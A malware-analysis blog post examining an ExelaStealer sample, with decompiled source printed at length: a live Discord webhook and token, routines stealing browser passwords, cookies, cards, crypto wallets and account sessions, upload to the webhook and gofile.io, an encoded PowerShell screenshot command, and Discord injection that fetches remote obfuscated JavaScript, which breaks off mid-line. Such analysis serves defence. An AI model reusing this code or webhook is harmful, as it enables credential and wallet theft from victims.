---
title: Malware Analyzing Series Blog 03
published: 2025-03-17
description: ExekaStealer Analyze Blog.
tags: [PE, Blogging, Malware Analyze]
category: Malware Analyze
draft: false
---

 Malware Analyzing Series Blog 03
## ST03172025 - Blog03 ExelaStealer

This was something I found interesting while looking for some new sample that got uploaded on [MalwareBazaar](https://bazaar.abuse.ch/browse/) I found it's quite cool so I decided to open an investigation on this PE.

---

![image](https://hackmd.io/_uploads/B11DfIB3yg.png)

The Mallicious PE was written in VB.net so in order to read this, we have to use dotpeek or dnspy, all the same but I do prefer dotpeek than dnspy

![image](https://hackmd.io/_uploads/H1eF8oS2Jg.png)

The first moment after open it in Dotpeek it seem there are 2 executable that will be dropped in the %temp% folder 

![image](https://hackmd.io/_uploads/S16tPjHhkg.png)

When scrolling down a bit more you can see it calling to the resources, checking the resource we can see there a massive chunk of data, but seem to be encrypted

![image](https://hackmd.io/_uploads/HyEVdoS31l.png)

![image](https://hackmd.io/_uploads/ByRQcjHn1x.png)

Since the PE will drop and decrypt it's self so I will run it and take all the PE that it dropped in the destined folder out instead of decrypting it by hand.

![image](https://hackmd.io/_uploads/H10YjsH2ye.png)

![image](https://hackmd.io/_uploads/HkgtssB2kg.png)

![image](https://hackmd.io/_uploads/HJzk2ornyx.png)

Since dotpeek already opened and payload.exe is written in C# so I will check out the payload.exe first. After openning the Payload.exe in dotpeek, we can see a very interesting function named "lzmat" and "lz", FYI this is where to read about ["lzma"](https://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Markov_chain_algorithm)

![image](https://hackmd.io/_uploads/Hy1p6ir3ye.png)

So look like it's decompressing itself, next let's check the **dfwx.exe**, since it was written in python and got compiled using Pyinstaller, there is a famous tool help extracting the python byte code, named [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) after getting the pyc, [pylingual](https://pylingual.io/) can help reconstructing the script way faster.

![image](https://hackmd.io/_uploads/rkhaxTHhJl.png)

The script execute some obfuscated, encrypoted byte code, so I will try to let it print out all the code that it decrypted, while doing that I found this message, 

```
# coded by quicaxd
#Exela is a best stealer of all time
#thanks for using exela
```

This determine that this Script is ExelaStealer, you can read more about it here: [Broadcom](https://www.broadcom.com/support/security-center/protection-bulletin/exela-stealer-malware) or [Fortinet](https://www.fortinet.com/blog/threat-research/exelastealer-infostealer-enters-the-field),... You can read the Decrypted script here since it's so long, I can't upload here, [Link](https://www.fortinet.com/blog/threat-research/exelastealer-infostealer-enters-the-field), the password is alway **infected**

![image](https://hackmd.io/_uploads/BkuBQJLhkx.png)

https://drive.google.com/drive/folders/1uz55G572q3Y1ebtUd0NknzkZwmZ08GHJ?usp=drive_link

At the start of the script, we can see it has a [Discord webhook](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks) and next to it there a tons of list seem like it store the info got stolen.

```py!
webhook = 'https://discordapp.com/api/webhooks/1349001056893538305/GHd5AURS7mt2MaQ6LvGL_v5kLBD_dkUzYI4x4sMXSRtfE9s1w76KjagYKTXWLEbKJCcj'
discord_injection = bool(False)
startup_method = "folder".lower()
Anti_VM = bool(True)
FakeError = (bool(False), ("System Error", "The Program can't start because api-ms-win-crt-runtime-|l1-1-.dll is missing from your computer. Try reinstalling the program to fix this problem", 0))
StealFiles = bool(True)
```

This what we got if we crawl the data from that webhook url back, we can also use this to send the message as the bot, since that how Discord Webhook work.

```json!
{
  "application_id": null,
  "avatar": "cdce5c4ce573c5b33fa8890e645796ce",
  "channel_id": "1349001034806329386",
  "guild_id": "1262984245459157042",
  "id": "1349001056893538305",
  "name": "dfwx",
  "type": 1,
  "token": "GHd5AURS7mt2MaQ6LvGL_v5kLBD_dkUzYI4x4sMXSRtfE9s1w76KjagYKTXWLEbKJCcj",
  "url": "https://discord.com/api/webhooks/1349001056893538305/GHd5AURS7mt2MaQ6LvGL_v5kLBD_dkUzYI4x4sMXSRtfE9s1w76KjagYKTXWLEbKJCcj"
}
```

![image](https://hackmd.io/_uploads/BkfEETHn1e.png)

```py!
class Variables:
    Passwords = list()
    Cards = list()
    Cookies = list()
    Historys = list()
    Downloads = list()
    Autofills = list()
    Bookmarks = list()
    Wifis = list()
    SystemInfo = list()
    ClipBoard = list()
    Processes = list()
    Network = list()
    FullTokens = list()
    ValidatedTokens = list()
    DiscordAccounts = list()
    SteamAccounts = list()
    InstagramAccounts = list()
    TwitterAccounts = list()
    TikTokAccounts = list()
    RedditAccounts = list()
    TwtichAccounts = list()
    SpotifyAccounts = list()
    RobloxAccounts = list()
    RiotGameAccounts = list()
```

We also got a interesting powershell script, encoded in base64

```py!
async def WriteToText(self) -> None:
        try:
            cmd = "wmic csproduct get uuid"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            
            stdout, stderr = await process.communicate()
            output_lines = stdout.decode(errors="ignore").split("\n")
            uuid = output_lines[1].strip() if len(output_lines) > 1 else None
            filePath = os.path.join(self.Temp, uuid)
            if os.path.isdir(filePath):
                shutil.rmtree(filePath)
            os.mkdir(filePath)
            os.mkdir(os.path.join(filePath, "Browsers"))
            os.mkdir(os.path.join(filePath, "Sessions"))
            os.mkdir(os.path.join(filePath, "Tokens"))
            os.mkdir(os.path.join(filePath, "Games"))
            await self.GetWallets(filePath)
            await self.StealTelegramSession(filePath)
            await self.StealUplay(uuid)
            await self.StealEpicGames(uuid)
            await self.StealGrowtopia(uuid)
            await self.StealSteamSessionFiles(uuid)
            if len(os.listdir(os.path.join(filePath, "Games"))) == 0:
                try:
                    shutil.rmtree(os.path.join(filePath, "Games"))
                except:pass
            if self.FireFox:
                os.mkdir(os.path.join(filePath, "Browsers", "Firefox"))
            command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
            process = await asyncio.create_subprocess_shell(f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {command}",cwd=filePath,shell=True)
```

Using Cyberchef we can decode this pretty easily, I will also leave this script in the drive, for you can see it, this powershell script will capture a screenshot.

![image](https://hackmd.io/_uploads/B17v9Trn1g.png)

![image](https://hackmd.io/_uploads/S1CvjTrnyl.png)

Next it will be searching for all kind of account in the victim computer

```py!
password_list = Variables.Passwords
card_list = Variables.Cards
cookie_list = Variables.Cookies
history_list = Variables.Historys
bookmark_list = Variables.Bookmarks
autofill_list = Variables.Autofills
download_list = Variables.Downloads
riot_acc = Variables.RiotGameAccounts
insta_acc = Variables.InstagramAccounts
twitter_acc = Variables.TwitterAccounts
tiktok_acc = Variables.TikTokAccounts
reddit_acc = Variables.RedditAccounts
twitch_acc = Variables.TwtichAccounts
spotify_acc = Variables.SpotifyAccounts
steam_acc = Variables.SteamAccounts
roblox_acc = Variables.RobloxAccounts
```

we also got the discord link, in the code itself, so the code will loop through for file just to find if there any cookies, account, password, crypto wallet,... if there is it will store inside a list then make a folder in %temp% store them then zip it up and send through gofile.io

```py!
async def SendAllData(self) -> None:
        cmd = "wmic csproduct get uuid"
        process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            
        stdout, stderr = await process.communicate()
        output_lines = stdout.decode(errors="ignore").split("\n")
        uuid = output_lines[1].strip() if len(output_lines) > 1 else "NONE"
        filePath:str = os.path.join(self.Temp, uuid)
        shutil.make_archive(filePath, "zip", filePath)
        embed_data = {
            "title": "***dfwx stealer***",
            "description": f"***dfwx stealer full info breached.***",
            "url" : "https://discord.gg/######",
            "color": 0,
            "footer": {"text": "Join us @ discord.gg/######"},
            "thumbnail": {"url": "https://i.ibb.co/11Pnrd7/xen.png"}}
        fields = [
             {"name": "Password", "value": "``" + str(len(Variables.Passwords)) + "``", "inline": True},
             {"name": "Card", "value": "``" + str(len(Variables.Cards)) + "``", "inline": True},
             {"name": "Cookie", "value": "``" +  str(len(Variables.Cookies) + len(self.FirefoxCookieList)) + "``", "inline": True},
             {"name": "History", "value": "``" + str(len(Variables.Historys) + len(self.FirefoxHistoryList)) + "``", "inline": True},
             {"name": "Download", "value":"``" + str(len(Variables.Downloads)) + "``", "inline": True},
             {"name": "Bookmark", "value": "``" + str(len(Variables.Bookmarks)) + "``", "inline": True},
             {"name": "Autofill", "value": "``" + str(len(Variables.Autofills) + len(self.FirefoxAutofiList)) + "``", "inline": True},
             {"name": "Tokens", "value": "``" + str(len(Variables.FullTokens)) + "``", "inline": True},
             {"name": "Instagram", "value": "``" + str(len(Variables.InstagramAccounts)) + "``", "inline": True},
             {"name": "Twitter", "value": "``" + str(len(Variables.TwitterAccounts)) + "``", "inline": True},
             {"name": "TikTok", "value": "``" + str(len(Variables.TikTokAccounts)) + "``", "inline": True},
             {"name": "Twitch", "value": "``" + str(len(Variables.TwtichAccounts)) + "``", "inline": True},
             {"name": "Reddit", "value": "``" + str(len(Variables.RedditAccounts)) + "``", "inline": True},
             {"name": "Spotify", "value": "``" + str(len(Variables.SpotifyAccounts)) + "``", "inline": True},
             {"name": "Riot Game's", "value": "``" + str(len(Variables.RiotGameAccounts)) + "``", "inline": True},
             {"name": "Roblox", "value": "``" + str(len(Variables.RobloxAccounts)) + "``", "inline": True},
             {"name": "Steam", "value": "``" + str(len(Variables.SteamAccounts)) + "``", "inline": True},
             {"name": "Wifi", "value": "``" + str(len(Variables.Wifis)) + "``", "inline": True},
             {"name": "FireFox?", "value": "``" + str(self.FireFox) + "``", "inline": True},]
        embed_data["fields"] = fields
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
            payload = {
                "username": "dfwx stealer",
                "embeds": [embed_data] }
            headers = {
                 "Content-Type": "application/json"}
            async with session.post(webhook, json=payload, headers=headers) as response:
                pass
            await self.SendContains()
            if not os.path.getsize(filePath + ".zip") / (1024 * 1024) > 15:
                with open(filePath + ".zip", 'rb') as file:
                    dosya_verisi = file.read()
                payload = aiohttp.FormData()
                payload.add_field('file', dosya_verisi, filename=os.path.basename(filePath + ".zip"))
                async with session.post(webhook, data=payload) as f:
                    pass
                del payload
                
            else:
                succes = await UploadGoFile.upload_file(filePath + ".zip")
                if succes != None:
                    embed_data2 = {
                        "title": "***dfwx stealer***",
                        "description": f"***dfwx stealer full info***",
                        "url" : "https://discord.gg/#####",
                        "color": 0,
                        "footer": {"text": "Join us @ discord.gg/######"},
                        "thumbnail": {"url": "https://i.ibb.co/11Pnrd7/xen.png"}}
                    fields2 = [{"name": "Download Link", "value": f"[{uuid}.zip]({succes})", "inline": True}]
                    embed_data2["fields"] = fields2
                    payload2 = {
                        "username": "dfwx stealer",
                        "embeds": [embed_data2] }
                    async with session.post(webhook, json=payload2) as req:
                        pass
                else:print("file cannot uploaded to GoFile.")
            try:
                os.remove(filePath + ".zip")
                shutil.rmtree(filePath)
            except:
                pass
```

Stealing Crypto Wallet

```py!
async def GetWallets(self, copied_path:str) -> None:
        try:
            wallets_ext_names = {
                "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
                "Binance": "fhbohimaelbohpjbbldcngcnapndodjp",
                "Phantom": "bfnaelmomeimhlpmgjnjophhpkkoljpa",
                "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
                "Ronin": "fnjhmkhhmkbjkkabndcnnogagogbneec",
                "Exodus": "aholpfdialjgjfhomihkjbmgjidlcdno",
                "Coin98": "aeachknmefphepccionboohckonoeemg",
                "KardiaChain": "pdadjkfkgcafgbceimcpbkalnfnepbnk",
                "TerraStation": "aiifbnbfobpmeekipheeijimdpnlpgpp",
                "Wombat": "amkmjjmmflddogmhpjloimipbofnfjih",
                "Harmony": "fnnegphlobjdpkhecapkijjdkgcjhkib",
                "Nami": "lpfcbjknijpeeillifnkikgncikgfhdo",
                "MartianAptos": "efbglgofoippbgcjepnhiblaibcnclgk",
                "Braavos": "jnlgamecbpmbajjfhmmmlhejkemejdma",
                "XDEFI": "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
                "Yoroi": "ffnbelfdoeiohenkjibnmadjiehjhajb",
                "TON": "nphplpgoakhhjchkkhmiggakijnkhfnd",
                "Authenticator": "bhghoamapcdpbohphigoooaddinpkbai",
                "MetaMask_Edge": "ejbalbakoplchlghecdalmeeeajnimhm",
                "Tron": "ibnejdfjmmkpcnlpebklmnkoeoihofec",}
            wallet_local_paths = {
                "Bitcoin": os.path.join(self.RoamingAppData, "Bitcoin", "wallets"),
                "Zcash": os.path.join(self.RoamingAppData, "Zcash"),
                "Armory": os.path.join(self.RoamingAppData, "Armory"),
                "Bytecoin": os.path.join(self.RoamingAppData, "bytecoin"),
                "Jaxx": os.path.join(self.RoamingAppData, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"),
                "Exodus": os.path.join(self.RoamingAppData, "Exodus", "exodus.wallet"),
                "Ethereum": os.path.join(self.RoamingAppData, "Ethereum", "keystore"),
                "Electrum": os.path.join(self.RoamingAppData, "Electrum", "wallets"),
                "AtomicWallet": os.path.join(self.RoamingAppData, "atomic", "Local Storage","leveldb"),
                "Guarda": os.path.join(self.RoamingAppData, "Guarda", "Local Storage","leveldb"),
                "Coinomi": os.path.join(self.RoamingAppData, "Coinomi", "Coinomi", "wallets"),
            }
            os.mkdir(os.path.join(copied_path, "Wallets"))
            for path in self.profiles_full_path:
                ext_path = os.path.join(path, "Local Extension Settings") 
                if os.path.exists(ext_path):
                    for wallet_name, wallet_addr in wallets_ext_names.items():
                        if os.path.isdir(os.path.join(ext_path, wallet_addr)):
                            try:
                                splited = os.path.join(ext_path, wallet_addr).split("\\")
                                file_name = f"{splited[5]} {splited[6]} {splited[8]} {wallet_name}"
                                os.makedirs(copied_path  + "\\Wallets\\" + file_name)
                                shutil.copytree(os.path.join(ext_path, wallet_addr), os.path.join(copied_path, "Wallets", file_name, wallet_addr))
                            except:
                                continue
            for wallet_names, wallet_paths in wallet_local_paths.items():
                try:
                    if os.path.exists(wallet_paths):
                        shutil.copytree(wallet_paths, os.path.join(copied_path, "Wallets", wallet_names))
```

There a lots more function about stealing you can check yourself, in the ggdrive link but I will summerize them here

```
StealTelegramSession
RiotGamesSession
InstaSession
TikTokSession
TwitterSession
TwitchSession
SpotifySession
RedditSession
RobloxSession
GetSteamSession
...
```

After that it will start injecting mallicious code into your Discord launcher

```py!
async def InjectIntoToDiscord(self) -> None:
        try:
            if discord_injection:
                print("[+] Starting discord injection")
                discord_dirs = {
                        "Discord" : os.path.join(self.LocalAppData, "discord"),
                        "Discord Canary" : os.path.join(self.LocalAppData, "discordcanary"),
                        "Lightcord" : os.path.join(self.LocalAppData, "Lightcord"),
                        "Discord PTB" : os.path.join(self.LocalAppData, "discordptb"),
                    }
                injection_code = await self.GetInjectionCode()
                for f, file_paths in discord_dirs.items():
                    if os.path.exists(file_paths):
                        indexPath = await self.FindIndexPath(file_paths)
                        with open(indexPath, "r", encoding="utf-8", errors="ignore") as file:
                            if not webhook in file.read():
                                if not self.already_killed:
                                    await self.KillDiscord()
                                with open(indexPath, "w", encoding="utf-8", errors="ignore") as x:
                                    x.write(injection_code.replace("https://discordapp.com/api/webhooks/1349001056893538305/GHd5AURS7mt2MaQ6LvGL_v5kLBD_dkUzYI4x4sMXSRtfE9s1w76KjagYKTXWLEbKJCcj",webhook))
                                command = os.path.join(file_paths, "Update.exe") + " --processStart Discord.exe"
                                result = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, shell=True)
                                await result.communicate()
                print("[+] Discord Injection was executed successfuly")  
        except Exception as error:
            print(f"[-] An error occured while injection to discord, error code => \"{error}\"")

    async def GetInjectionCode(self) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://raw.githubusercontent.com/patrickzxxxxq/injection/main/etitz.js") as response:
                    data = await response.text()
                    return data.replace("https://discordapp.com/api/webhooks/1349001056893538305/GHd5AURS7mt2MaQ6LvGL_v5kLBD_dkUzYI4x4sMXSRtfE9s1w76KjagYKTXWLEbKJCcj", webhook)
        except Exception as error:
            print(f"[-] An error occured while getting injection code, error code => \"{error}\"")
            return None
```

I will inject a malicious javascript using github, here the script, it also got obfuscated, since this was a common type of js obfs so we can use an online tool to de-obfs this js

```js!
const _0x37f919=_0xcf0b;(function(_0x2e7667,_0x276318){const _0x4c8baf=_0xcf0b,_0x8d18d8=_0x2e7667();while(!![]){try{const _0x239b67=-parseInt(_0x4c8baf(0x173))/0x1*(-parseInt(_0x4c8baf(0x143))/0x2)+-parseInt(_0x4c8baf(0x16b))/0x3+parseInt(_0x4c8baf(0xde))/0x4*(parseInt(_0x4c8baf(0x15e))/0x5)+parseInt(_0x4c8baf(0x131))/0x6+parseInt(_0x4c8baf(0x10b))/0x7*(-parseInt(_0x4c8baf(0xeb))/0x8)+parseInt(_0x4c8baf(0x108))/0x9+-parseInt(_0x4c8baf(0xe9))/0xa;if(_0x239b67===_0x276318)break;else _0x8d18d8['push'](_0x8d18d8['shift']());}catch(_0x5e6022){_0x8d18d8['push'](_0x8d18d8['shift']());}}}(_0x25c8,0x5f5bd));const fs=require('fs'),os=require('os'),https=require('https'),args=process[_0x37f919(0x16f)],path=require(_0x37f919(0x162)),querystring=require(_0x37f919(0x184)),{BrowserWindow,session,app}=require(_0x37f919(0x138)),CONFIG={'webhook':_0x37f919(0x186),'injection_url':'https://raw.githubusercontent.com/patrickzxxxxq/injection/main/etitz.js','filters':{'urls':['/auth/login','/auth/register',_0x37f919(0x149),_0x37f919(0x15b),_0x37f919(0x15f)]},'filters2':{'urls':[_0x37f919(0x157),_0x37f919(0x180),_0x37f919(0x16c),'https://discordapp.com/api/v*/auth/sessions']},'payment_filters':{'urls':['https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',_0x37f919(0x14a)]},'API':'https://discord.com/api/v9/users/@me','badges':{'Discord_Emloyee':{'Value':0x1,'Emoji':'<:8485discordemployee:1163172252989259898>','Rare':!![]},'Partnered_Server_Owner':{'Value':0x2,'Emoji':_0x37f919(0x148),'Rare':!![]},'HypeSquad_Events':{'Value':0x4,'Emoji':_0x37f919(0x188),'Rare':!![]},'Bug_Hunter_Level_1':{'Value':0x8,'Emoji':_0x37f919(0x139),'Rare':!![]},'Early_Supporter':{'Value':0x200,'Emoji':_0x37f919(0x114),'Rare':!![]},'Bug_Hunter_Level_2':{'Value':0x4000,'Emoji':_0x37f919(0x12f),'Rare':!![]},'Early_Verified_Bot_Developer':{'Value':0x20000,'Emoji':_0x37f919(0x171),'Rare':!![]},'House_Bravery':{'Value':0x40,'Emoji':_0x37f919(0x11f),'Rare':![]},'House_Brilliance':{'Value':0x80,'Emoji':_0x37f919(0x10c),'Rare':![]},'House_Balance':{'Value':0x100,'Emoji':_0x37f919(0x13d),'Rare':![]},'Active_Developer':{'Value':0x400000,'Emoji':_0x37f919(0x150),'Rare':![]},'Certified_Moderator':{'Value':0x40000,'Emoji':_0x37f919(0x10d),'Rare':!![]},'Spammer':{'Value':0x100080,'Emoji':'⌨️','Rare':![]}}},executeJS=_0x3afa9f=>{const _0x497c57=_0x37f919,_0x4dd57a=BrowserWindow[_0x497c57(0x14b)]()[0x0];return _0x4dd57a[_0x497c57(0xef)][_0x497c57(0x14f)](_0x3afa9f,!![]);},clearAllUserData=()=>{const _0x5da9f5=_0x37f919,_0x1a5ce0=BrowserWindow[_0x5da9f5(0x14b)]()[0x0];_0x1a5ce0[_0x5da9f5(0xef)][_0x5da9f5(0x163)][_0x5da9f5(0x10f)](),_0x1a5ce0[_0x5da9f5(0xef)][_0x5da9f5(0x163)][_0x5da9f5(0x174)](),app[_0x5da9f5(0xf1)](),app['exit']();},getToken=async()=>await executeJS('(webpackChunkdiscord_app.push([[\x27\x27],{},e=>{m=[];for(let\x20c\x20in\x20e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void\x200).exports.default.getToken()'),request=async(_0x4f50b5,_0x1420bd,_0x2de5ab,_0x4c9477)=>{const _0x5435ba=_0x37f919;_0x1420bd=new URL(_0x1420bd);const _0x3f710f={'protocol':_0x1420bd[_0x5435ba(0x155)],'hostname':_0x1420bd[_0x5435ba(0x123)],'path':_0x1420bd[_0x5435ba(0x189)],'method':_0x4f50b5,'headers':{'Access-Control-Allow-Origin':'*'}};_0x1420bd['search']&&(_0x3f710f[_0x5435ba(0x162)]+=_0x1420bd[_0x5435ba(0x133)]);for(const _0x409b15 in _0x2de5ab)_0x3f710f[_0x5435ba(0xe2)][_0x409b15]=_0x2de5ab[_0x409b15];const _0x4c1bb0=https[_0x5435ba(0x124)](_0x3f710f);return _0x4c9477&&_0x4c1bb0['write'](_0x4c9477),(_0x4c1bb0[_0x5435ba(0x122)](),new Promise((_0xc541cc,_0x379da8)=>{const _0x189f71=_0x5435ba;_0x4c1bb0['on'](_0x189f71(0xf7),_0x2971b7=>{const _0x4ced84=_0x189f71;let _0x1738df='';_0x2971b7['on'](_0x4ced84(0x14c),_0x4c03ec=>_0x1738df+=_0x4c03ec),_0x2971b7['on'](_0x4ced84(0x122),()=>_0xc541cc(_0x1738df));});}));},hooker=async(_0x3ffec3,_0x1629a5,_0x278a5b)=>{const _0x220fea=_0x37f919;_0x3ffec3['username']='X',_0x3ffec3[_0x220fea(0x152)]=_0x220fea(0x11e),_0x3ffec3[_0x220fea(0xee)][0x0][_0x220fea(0x167)]={'name':_0x278a5b[_0x220fea(0xf6)]},_0x3ffec3[_0x220fea(0xee)][0x0][_0x220fea(0x18c)]={'url':_0x220fea(0x187)+_0x278a5b['id']+'/'+_0x278a5b[_0x220fea(0x101)]+_0x220fea(0x182)},_0x3ffec3['embeds'][0x0][_0x220fea(0xf2)]={'text':_0x220fea(0x160),'icon_url':'https://i.hizliresim.com/5hgxpg1.jpg'},_0x3ffec3[_0x220fea(0xee)][0x0][_0x220fea(0x15a)]=_0x220fea(0xec);const _0xe12589=getNitro(_0x278a5b[_0x220fea(0x158)]),_0x3c3de5=getBadges(_0x278a5b['flags']),_0x10a2e5=await getBilling(_0x1629a5),_0x4bd034=await getFriends(_0x1629a5),_0x1b74f5=await getServers(_0x1629a5);_0x3ffec3[_0x220fea(0xee)][0x0][_0x220fea(0x176)][_0x220fea(0xe7)]({'name':_0x220fea(0x12e),'value':_0x220fea(0xf8)+_0x1629a5+_0x220fea(0xf8),'inline':![]},{'name':'Nitro','value':_0xe12589,'inline':!![]},{'name':_0x220fea(0x112),'value':_0x3c3de5,'inline':!![]},{'name':'Billing','value':_0x10a2e5,'inline':!![]}),_0x3ffec3[_0x220fea(0xee)]['push']();for(const _0x4c9d0e in _0x3ffec3['embeds']){_0x3ffec3[_0x220fea(0xee)][_0x4c9d0e]['color']=0x0;}await request(_0x220fea(0x161),CONFIG['webhook'],{'Content-Type':_0x220fea(0x17c)},JSON[_0x220fea(0xe8)](_0x3ffec3));},fetch=async(_0x43bfb5,_0x44d042)=>{const _0x1135b7=_0x37f919;return JSON[_0x1135b7(0x102)](await request('GET',CONFIG[_0x1135b7(0x132)]+_0x43bfb5,_0x44d042));},fetchAccount=async _0x590cc3=>await fetch('',{'Authorization':_0x590cc3}),fetchBilling=async _0x918cee=>await fetch(_0x37f919(0x14d),{'Authorization':_0x918cee}),fetchServers=async _0x3decb8=>await 